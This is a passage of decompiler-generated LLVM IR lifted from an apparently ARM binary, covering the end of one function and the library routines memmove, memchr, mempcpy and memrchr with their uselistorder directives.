  store i1 %v7_ff08, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_ff10

dec_label_pc_ff10:                                ; preds = %dec_label_pc_ff10.loopexit, %dec_label_pc_feec
  %v2_fd7c64 = phi i32 [ %v5_ff04, %dec_label_pc_ff10.loopexit ], [ %v1_fee0, %dec_label_pc_feec ]
  %v0_fd6c60 = phi i32 [ %v2_ff08, %dec_label_pc_ff10.loopexit ], [ %v2_fef0, %dec_label_pc_feec ]
  %v0_ff10 = load i32, i32* %r1.global-to-local, align 4
  %v1_ff10 = add i32 %v0_ff10, 1
  store i32 %v1_ff10, i32* @r1, align 4
  br label %bb142

; uselistorder directives
  uselistorder i32 %v5_ff04, { 0, 2, 1 }
  uselistorder i32 %v3_fef8, { 1, 0 }
  uselistorder i32 %v2_fef0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_fee0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_fec0, { 1, 0 }
  uselistorder i32 %v3_febc, { 1, 0 }
  uselistorder i32 %v0_fec0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_fee0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_fe98, { 0, 2, 1 }
  uselistorder i32 %v3_fe8c, { 1, 0 }
  uselistorder i32 %v2_fe84, { 0, 2, 1, 3 }
  uselistorder i32 %v1_fe74, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_fe54, { 1, 0 }
  uselistorder i32 %v3_fe50, { 1, 0 }
  uselistorder i32 %v0_fe54, { 3, 2, 1, 0 }
  uselistorder i32 %v0_fe74, { 3, 2, 1, 0 }
  uselistorder i32 %v5_fe2c, { 0, 2, 1 }
  uselistorder i32 %v3_fe20, { 1, 0 }
  uselistorder i32 %v2_fe18, { 0, 2, 1, 3 }
  uselistorder i32 %v1_fe08, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_fde8, { 1, 0 }
  uselistorder i32 %v3_fde4, { 1, 0 }
  uselistorder i32 %v0_fde8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_fe08, { 3, 2, 1, 0 }
  uselistorder i1 %v5_feb0, { 2, 0, 1 }
  uselistorder i32 %v0_fdc8, { 1, 0 }
  uselistorder i32 %v0_feb4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_fe0830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_fdb8, { 2, 1, 0 }
  uselistorder i32 %v0_fdb8, { 2, 0, 1 }
  uselistorder i32 %v2_fdb0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_fdb0, { 1, 0, 2 }
  uselistorder i32 %v0_fdb0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_fe0831, { 2, 1, 0 }
  uselistorder i32 %v11_fd8c, { 1, 0 }
  uselistorder i32 %v7_fd8c, { 1, 0 }
  uselistorder i32 %v1_fd6c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_fd6c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_fd70, { 1, 0 }
  uselistorder i32 %v7_fd64, { 0, 2, 1 }
  uselistorder i32 %v10_fd60, { 1, 0 }
  uselistorder i32 %v9_fd58, { 1, 0, 2 }
  uselistorder i32 %v6_fd54, { 1, 0 }
  uselistorder i32 %v2_fd4c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_fd4c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_fd5c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_fd40, { 0, 2, 1 }
  uselistorder i32 %v13_fd3c, { 1, 0 }
  uselistorder i32 %v4_fd38, { 0, 2, 1, 3 }
  uselistorder i32 %v0_fd38, { 2, 0, 1 }
  uselistorder i32 %v6_fd40, { 0, 3, 2, 1 }
  uselistorder i32 %v7_fd30, { 0, 2, 1 }
  uselistorder i32 %v16_fd2c, { 1, 0 }
  uselistorder i32 %v4_fd28, { 1, 0 }
  uselistorder i32 %v0_fd38.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_fd30, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_fd1c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_fd18, { 1, 0 }
  uselistorder i32 %v1_fd14, { 1, 0 }
  uselistorder i32 %v10_fd10, { 1, 0 }
  uselistorder i32 %v0_fd10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_fd14, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_fd08, { 0, 2, 1 }
  uselistorder i32 %v2_fcfc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_fcfc, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_fd1448, { 1, 2, 0 }
  uselistorder i32 %v1_fcf4, { 2, 1, 0 }
  uselistorder i32 %v1_fcec, { 2, 3, 1, 0 }
  uselistorder i32 %v2_fce4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_fce0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_fcdc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_fcdc, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_fcc8, { 0, 2, 1 }
  uselistorder i32 %v3_fcbc, { 1, 0 }
  uselistorder i32 %v2_fcb4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_fca4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_fc84, { 1, 0, 2 }
  uselistorder i32 %v5_fc84, { 1, 0, 2 }
  uselistorder i32 %v2_fc84, { 1, 0, 2 }
  uselistorder i32 %v0_fc84, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fca4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_fc5c, { 0, 2, 1 }
  uselistorder i32 %v3_fc50, { 1, 0 }
  uselistorder i32 %v2_fc48, { 0, 2, 1, 3 }
  uselistorder i32 %v12_fc38, { 1, 0, 3, 2 }
  uselistorder i32 %v8_fc18, { 1, 0, 2 }
  uselistorder i32 %v5_fc18, { 1, 0, 2 }
  uselistorder i32 %v2_fc18, { 1, 0, 2 }
  uselistorder i32 %v0_fc18, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fc38, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_fbf0, { 0, 2, 1 }
  uselistorder i32 %v3_fbe4, { 1, 0 }
  uselistorder i32 %v2_fbdc, { 0, 2, 1, 3 }
  uselistorder i32 %v12_fbcc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_fbac, { 1, 0, 2 }
  uselistorder i32 %v5_fbac, { 1, 0, 2 }
  uselistorder i32 %v2_fbac, { 1, 0, 2 }
  uselistorder i32 %v0_fbac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fbcc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_fc74, { 2, 0, 1 }
  uselistorder i32 %v0_fc78, { 3, 0, 2, 1 }
  uselistorder i32 %v0_fbcc74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_fb7c, { 1, 0 }
  uselistorder i32 %v0_fb7c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_fb74, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_fb74, { 1, 0, 2 }
  uselistorder i32 %v0_fb74, { 2, 0, 1, 3 }
  uselistorder i32 %v0_fbcc75, { 2, 1, 0 }
  uselistorder i32 %v1_fb54, { 1, 0, 2 }
  uselistorder i32 %v1_fb2c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_fb2c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_fb18, { 1, 0, 2 }
  uselistorder i32 %v6_fb14, { 1, 0 }
  uselistorder i32 %v2_fb0c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_fb0c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_fb1c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_fb04, { 0, 2, 1 }
  uselistorder i1 %v0_fb04, { 1, 0 }
  uselistorder i1 %v1_fb04, { 1, 0 }
  uselistorder i32 %v3_fb00, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_faf8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_fae4, { 1, 0 }
  uselistorder i32 %v12_fad8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_facc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fad0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_fac0, { 0, 2, 1 }
  uselistorder i32 %v2_fab8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_fab8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_fab0, { 1, 0 }
  uselistorder i32 %v1_faa8, { 2, 1, 0 }
  uselistorder i32 %v2_faa0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_faa0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fa90, { 1, 0 }
  uselistorder i32 %v1_fa90, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_fa90, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 0, 60, 1, 2, 3, 4, 5, 61, 6, 7, 8, 9, 10, 62, 11, 12, 13, 14, 15, 63, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 64, 65, 66, 67, 69, 68, 30, 31, 56, 32, 33, 34, 35, 36, 57, 37, 38, 39, 40, 41, 58, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 12, 2, 3, 5, 4, 13, 6, 7, 10, 8, 14, 9, 11, 15, 16, 17, 35, 36, 34, 18, 19, 22, 20, 28, 21, 23, 26, 24, 29, 25, 27, 30, 31, 32, 33 }
  uselistorder i32* %r0.global-to-local, { 3, 50, 4, 5, 51, 6, 7, 52, 8, 9, 10, 11, 12, 13, 53, 14, 16, 15, 17, 18, 54, 19, 20, 55, 21, 22, 23, 24, 56, 57, 59, 60, 25, 32, 26, 27, 33, 28, 29, 30, 31, 34, 35, 0, 36, 37, 39, 38, 40, 41, 58, 42, 43, 44, 47, 45, 46, 48, 49, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 41, 0, 42, 1, 24, 2, 25, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 45, 46, 47, 0, 48, 1, 25, 2, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 12, 13, 14, 15, 16, 17, 11, 10, 4, 9, 8, 7, 6, 18, 19, 20, 21, 5, 22, 23, 2, 0, 27, 24, 25, 26, 1, 28, 29, 3 }
  uselistorder label %dec_label_pc_fef8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fe8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fe20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fdc0, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb142, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_fd4c, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_fd10, { 1, 0 }
  uselistorder label %dec_label_pc_fcfc, { 1, 0 }
  uselistorder label %dec_label_pc_fcbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fc50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fbe4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb84, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb132, { 6, 4, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_faf8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_fab8, { 1, 0 }
}

define i32 @function_ff18(i32 %arg1) local_unnamed_addr {
dec_label_pc_ff18:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_ff20 = load i32, i32* @r0, align 4
  %v1_ff20 = load i32, i32* @r1, align 4
  %v2_ff20 = inttoptr i32 %v0_ff20 to i8*
  %v3_ff20 = call i32 @_memcpy(i8* %v2_ff20, i32 %v1_ff20)
  ret i32 %v3_ff20

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_ff30 = load i32, i32* @r4, align 4
  %v6_ff30 = load i32, i32* @r5, align 4
  %v9_ff30 = load i32, i32* @r6, align 4
  %v1_ff34 = urem i32 %arg1, 256
  %v0_ff5018 = load i32, i32* @r2, align 4
  %v2_ff5020 = icmp eq i32 %v0_ff5018, 0
  br i1 %v2_ff5020, label %dec_label_pc_ff60, label %dec_label_pc_ff58

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_ff58
  %v3_ff3c = load i8, i8* %.021, align 1
  %v4_ff3c = zext i8 %v3_ff3c to i32
  %v9_ff40 = icmp eq i32 %v4_ff3c, %v1_ff34
  %v1_ff44 = add i32 %v0_ff44, -1
  br i1 %v9_ff40, label %bb, label %dec_label_pc_ff50

bb:                                               ; preds = %dec_label_pc_ff3c
  ret i32 %v1_ff58

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ff3c
  %v2_ff4c = add i32 %v1_ff58, 1
  %v3_ff4c = inttoptr i32 %v2_ff4c to i8*
  %v2_ff50 = icmp eq i32 %v1_ff44, 0
  br i1 %v2_ff50, label %dec_label_pc_ff60, label %dec_label_pc_ff58

dec_label_pc_ff58:                                ; preds = %entry, %dec_label_pc_ff50
  %v0_ff44 = phi i32 [ %v1_ff44, %dec_label_pc_ff50 ], [ %v0_ff5018, %entry ]
  %.021 = phi i8* [ %v3_ff4c, %dec_label_pc_ff50 ], [ undef, %entry ]
  %v1_ff58 = ptrtoint i8* %.021 to i32
  %v2_ff58 = urem i32 %v1_ff58, 4
  %v3_ff58 = icmp eq i32 %v2_ff58, 0
  br i1 %v3_ff58, label %dec_label_pc_ff60, label %dec_label_pc_ff3c

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff50, %dec_label_pc_ff58, %entry
  %v0_ffec37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_ff50 ], [ %v0_ff44, %dec_label_pc_ff58 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_ff4c, %dec_label_pc_ff50 ], [ %.021, %dec_label_pc_ff58 ]
  %v4_ff60 = mul nuw nsw i32 %v1_ff34, 256
  %v5_ff60 = or i32 %v4_ff60, %v1_ff34
  %v1_ff64 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_ff64, i32* @ip, align 4
  %v4_ff68 = mul i32 %v5_ff60, 65536
  %v5_ff68 = or i32 %v4_ff68, %v5_ff60
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_ffec37, 3
  br i1 %tmp, label %dec_label_pc_ff70, label %dec_label_pc_10014.preheader

dec_label_pc_ff70:                                ; preds = %dec_label_pc_ff60, %dec_label_pc_ffec.backedge
  %v0_ff8c82 = phi i32 [ %v1_ff8c, %dec_label_pc_ffec.backedge ], [ %v0_ffec37, %dec_label_pc_ff60 ]
  %v0_ff7081 = phi i32 [ %v4_ff70, %dec_label_pc_ffec.backedge ], [ %v1_ff64, %dec_label_pc_ff60 ]
  %v1_ff70 = inttoptr i32 %v0_ff7081 to i32*
  %v2_ff70 = load i32, i32* %v1_ff70, align 4
  %v4_ff70 = add i32 %v0_ff7081, 4
  store i32 %v4_ff70, i32* @ip, align 4
  %v2_ff74 = xor i32 %v2_ff70, %v5_ff68
  %v2_ff78 = add i32 %v2_ff74, 2130640639
  %v1_ff7c = sub i32 -1, %v2_ff74
  %v2_ff80 = xor i32 %v2_ff78, %v1_ff7c
  %v2_ff84 = and i32 %v2_ff80, -2130640640
  %v2_ff88 = icmp eq i32 %v2_ff84, 0
  %v1_ff8c = add i32 %v0_ff8c82, -4
  br i1 %v2_ff88, label %dec_label_pc_ffec.backedge, label %dec_label_pc_ff94

dec_label_pc_ffec.backedge:                       ; preds = %dec_label_pc_ff70, %dec_label_pc_ffd8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_ff8c, 3
  br i1 %tmp107, label %dec_label_pc_ff70, label %dec_label_pc_10014.preheader

dec_label_pc_ff94:                                ; preds = %dec_label_pc_ff70
  %v2_ff94 = inttoptr i32 %v0_ff7081 to i8*
  %v3_ff94 = load i8, i8* %v2_ff94, align 1
  %v4_ff94 = zext i8 %v3_ff94 to i32
  %v9_ff9c = icmp eq i32 %v4_ff94, %v1_ff34
  %v1_ffa0 = add i32 %v0_ff7081, 3
  %v1_ffa4 = add i32 %v0_ff7081, 1
  store i32 %v1_ffa4, i32* @lr, align 4
  %v1_ffa8 = add i32 %v0_ff7081, 2
  br i1 %v9_ff9c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_ff94
  store i32 %v3_ff30, i32* @r4, align 4
  store i32 %v6_ff30, i32* @r5, align 4
  store i32 %v9_ff30, i32* @r6, align 4
  ret i32 %v0_ff7081

bb51:                                             ; preds = %dec_label_pc_ff94
  %v2_ffb0 = inttoptr i32 %v1_ffa4 to i8*
  %v3_ffb0 = load i8, i8* %v2_ffb0, align 1
  %v4_ffb0 = zext i8 %v3_ffb0 to i32
  %v9_ffb4 = icmp eq i32 %v4_ffb0, %v1_ff34
  br i1 %v9_ffb4, label %dec_label_pc_ffbc, label %dec_label_pc_ffc4

dec_label_pc_ffbc:                                ; preds = %bb51
  store i32 %v3_ff30, i32* @r4, align 4
  store i32 %v6_ff30, i32* @r5, align 4
  store i32 %v9_ff30, i32* @r6, align 4
  ret i32 %v1_ffa4

dec_label_pc_ffc4:                                ; preds = %bb51
  %v2_ffc4 = inttoptr i32 %v1_ffa8 to i8*
  %v3_ffc4 = load i8, i8* %v2_ffc4, align 1
  %v4_ffc4 = zext i8 %v3_ffc4 to i32
  %v9_ffc8 = icmp eq i32 %v4_ffc4, %v1_ff34
  br i1 %v9_ffc8, label %dec_label_pc_ffd0, label %dec_label_pc_ffd8

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_ffc4
  store i32 %v3_ff30, i32* @r4, align 4
  store i32 %v6_ff30, i32* @r5, align 4
  store i32 %v9_ff30, i32* @r6, align 4
  ret i32 %v1_ffa8

dec_label_pc_ffd8:                                ; preds = %dec_label_pc_ffc4
  %v2_ffd8 = inttoptr i32 %v1_ffa0 to i8*
  %v3_ffd8 = load i8, i8* %v2_ffd8, align 1
  %v4_ffd8 = zext i8 %v3_ffd8 to i32
  %v9_ffdc = icmp eq i32 %v4_ffd8, %v1_ff34
  br i1 %v9_ffdc, label %dec_label_pc_ffe4, label %dec_label_pc_ffec.backedge

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffd8
  store i32 %v3_ff30, i32* @r4, align 4
  store i32 %v6_ff30, i32* @r5, align 4
  store i32 %v9_ff30, i32* @r6, align 4
  ret i32 %v1_ffa0

dec_label_pc_10014.preheader:                     ; preds = %dec_label_pc_ffec.backedge, %dec_label_pc_ff60
  %v0_ff70.lcssa = phi i32 [ %v1_ff64, %dec_label_pc_ff60 ], [ %v4_ff70, %dec_label_pc_ffec.backedge ]
  %v0_ff8c.lcssa = phi i32 [ %v0_ffec37, %dec_label_pc_ff60 ], [ %v1_ff8c, %dec_label_pc_ffec.backedge ]
  %v2_1001411 = icmp eq i32 %v0_ff8c.lcssa, 0
  br i1 %v2_1001411, label %dec_label_pc_1001c, label %dec_label_pc_10004

dec_label_pc_10004:                               ; preds = %dec_label_pc_10014, %dec_label_pc_10014.preheader
  %v0_10014.in = phi i32 [ %v0_10014, %dec_label_pc_10014 ], [ %v0_ff8c.lcssa, %dec_label_pc_10014.preheader ]
  %v15_1000c = phi i32 [ %v1_10010, %dec_label_pc_10014 ], [ %v0_ff70.lcssa, %dec_label_pc_10014.preheader ]
  %v0_10014 = add i32 %v0_10014.in, -1
  %v1_10004 = inttoptr i32 %v15_1000c to i8*
  %v2_10004 = load i8, i8* %v1_10004, align 1
  %v3_10004 = zext i8 %v2_10004 to i32
  %v9_10008 = icmp eq i32 %v3_10004, %v1_ff34
  br i1 %v9_10008, label %bb52, label %dec_label_pc_10014

bb52:                                             ; preds = %dec_label_pc_10004
  store i32 %v3_ff30, i32* @r4, align 4
  store i32 %v6_ff30, i32* @r5, align 4
  store i32 %v9_ff30, i32* @r6, align 4
  ret i32 %v15_1000c

dec_label_pc_10014:                               ; preds = %dec_label_pc_10004
  %v1_10010 = add i32 %v15_1000c, 1
  %v2_10014 = icmp eq i32 %v0_10014, 0
  br i1 %v2_10014, label %dec_label_pc_1001c, label %dec_label_pc_10004

dec_label_pc_1001c:                               ; preds = %dec_label_pc_10014, %dec_label_pc_10014.preheader
  store i32 %v3_ff30, i32* @r4, align 4
  store i32 %v6_ff30, i32* @r5, align 4
  store i32 %v9_ff30, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1000c, { 1, 0, 2 }
  uselistorder i32 %v1_ff8c, { 1, 0, 2 }
  uselistorder i32 %v4_ff70, { 0, 2, 1 }
  uselistorder i32 %v0_ff7081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_ff60, { 1, 0 }
  uselistorder i32 %v0_ffec37, { 1, 2, 0 }
  uselistorder i32 %v1_ff34, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_ff30, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_ffec.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_ff70, { 1, 0 }
  uselistorder label %dec_label_pc_ff60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ff58, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_10038 = call i32 @memcpy()
  %v0_1003c = load i32, i32* @r5, align 4
  %v1_1003c = load i32, i32* @r4, align 4
  %v2_1003c = add i32 %v1_1003c, %v0_1003c
  ret i32 %v2_1003c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10044 = load i32, i32* @r4, align 4
  %v1_10048 = urem i32 %arg2, 256
  %v2_1004c = add i32 %arg3, %arg1
  %v2_100642 = icmp eq i32 %arg3, 0
  br i1 %v2_100642, label %dec_label_pc_10074, label %dec_label_pc_1006c

dec_label_pc_10054:                               ; preds = %dec_label_pc_1006c
  %v1_10054 = add i32 %v0_10054, -1
  %v2_10054 = inttoptr i32 %v1_10054 to i8*
  %v3_10054 = load i8, i8* %v2_10054, align 1
  %v4_10054 = zext i8 %v3_10054 to i32
  %v9_10058 = icmp eq i32 %v4_10054, %v1_10048
  br i1 %v9_10058, label %bb, label %dec_label_pc_10064

bb:                                               ; preds = %dec_label_pc_10054
  ret i32 %v1_10054

dec_label_pc_10064:                               ; preds = %dec_label_pc_10054
  %v1_10060 = add i32 %v0_10060, -1
  %v2_10064 = icmp eq i32 %v1_10060, 0
  br i1 %v2_10064, label %dec_label_pc_10074, label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %entry, %dec_label_pc_10064
  %v0_10060 = phi i32 [ %v1_10060, %dec_label_pc_10064 ], [ %arg3, %entry ]
  %v0_10054 = phi i32 [ %v1_10054, %dec_label_pc_10064 ], [ %v2_1004c, %entry ]
  %v1_1006c = urem i32 %v0_10054, 4
  %v2_1006c = icmp eq i32 %v1_1006c, 0
  br i1 %v2_1006c, label %dec_label_pc_10074, label %dec_label_pc_10054

dec_label_pc_10074:                               ; preds = %dec_label_pc_10064, %dec_label_pc_1006c, %entry
  %v0_1010c11 = phi i32 [ %v2_1004c, %entry ], [ %v1_10054, %dec_label_pc_10064 ], [ %v0_10054, %dec_label_pc_1006c ]
  %v0_100f87 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_10064 ], [ %v0_10060, %dec_label_pc_1006c ]
  %v4_10074 = mul nuw nsw i32 %v1_10048, 256
  %v5_10074 = or i32 %v4_10074, %v1_10048
  %v4_10078 = mul i32 %v5_10074, 65536
  %v5_10078 = or i32 %v4_10078, %v5_10074
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_100f87, 3
  br i1 %tmp, label %dec_label_pc_10080, label %dec_label_pc_10108

dec_label_pc_10080:                               ; preds = %dec_label_pc_10074, %.backedge.backedge
  %v0_1009c51 = phi i32 [ %v1_1009c, %.backedge.backedge ], [ %v0_100f87, %dec_label_pc_10074 ]
  %v0_1008050 = phi i32 [ %v1_10080, %.backedge.backedge ], [ %v0_1010c11, %dec_label_pc_10074 ]
  %v1_10080 = add i32 %v0_1008050, -4
  %v2_10080 = inttoptr i32 %v1_10080 to i32*
  %v3_10080 = load i32, i32* %v2_10080, align 4
  %v2_10084 = xor i32 %v3_10080, %v5_10078
  %v2_10088 = add i32 %v2_10084, 2130640639
  %v1_1008c = sub i32 -1, %v2_10084
  %v2_10090 = xor i32 %v2_10088, %v1_1008c
  %v2_10094 = and i32 %v2_10090, -2130640640
  %v2_10098 = icmp eq i32 %v2_10094, 0
  %v1_1009c = add i32 %v0_1009c51, -4
  br i1 %v2_10098, label %.backedge.backedge, label %dec_label_pc_100a4

dec_label_pc_100a4:                               ; preds = %dec_label_pc_10080
  %v1_100a4 = add i32 %v0_1008050, -1
  %v2_100a4 = inttoptr i32 %v1_100a4 to i8*
  %v3_100a4 = load i8, i8* %v2_100a4, align 1
  %v4_100a4 = zext i8 %v3_100a4 to i32
  %v9_100a8 = icmp eq i32 %v4_100a4, %v1_10048
  %v1_100ac = add i32 %v0_1008050, -2
  store i32 %v1_100ac, i32* @ip, align 4
  %v1_100b4 = add i32 %v0_1008050, -3
  store i32 %v1_100b4, i32* @lr, align 4
  br i1 %v9_100a8, label %dec_label_pc_100bc, label %dec_label_pc_100c4

dec_label_pc_100bc:                               ; preds = %dec_label_pc_100a4
  store i32 %v3_10044, i32* @r4, align 4
  ret i32 %v1_100a4

dec_label_pc_100c4:                               ; preds = %dec_label_pc_100a4
  %v2_100c4 = inttoptr i32 %v1_100ac to i8*
  %v3_100c4 = load i8, i8* %v2_100c4, align 1
  %v4_100c4 = zext i8 %v3_100c4 to i32
  %v9_100c8 = icmp eq i32 %v4_100c4, %v1_10048
  br i1 %v9_100c8, label %dec_label_pc_100d0, label %dec_label_pc_100d8

dec_label_pc_100d0:                               ; preds = %dec_label_pc_100c4
  store i32 %v3_10044, i32* @r4, align 4
  ret i32 %v1_100ac

dec_label_pc_100d8:                               ; preds = %dec_label_pc_100c4
  %v2_100d8 = inttoptr i32 %v1_100b4 to i8*
  %v3_100d8 = load i8, i8* %v2_100d8, align 1
  %v4_100d8 = zext i8 %v3_100d8 to i32
  %v9_100dc = icmp eq i32 %v4_100d8, %v1_10048
  br i1 %v9_100dc, label %dec_label_pc_100e4, label %dec_label_pc_100ec

dec_label_pc_100e4:                               ; preds = %dec_label_pc_100d8
  store i32 %v3_10044, i32* @r4, align 4
  ret i32 %v1_100b4

dec_label_pc_100ec:                               ; preds = %dec_label_pc_100d8
  %v1_100ec = inttoptr i32 %v1_10080 to i8*
  %v2_100ec = load i8, i8* %v1_100ec, align 1
  %v3_100ec = zext i8 %v2_100ec to i32
  %v9_100f0 = icmp eq i32 %v3_100ec, %v1_10048
  br i1 %v9_100f0, label %bb19, label %.backedge.backedge

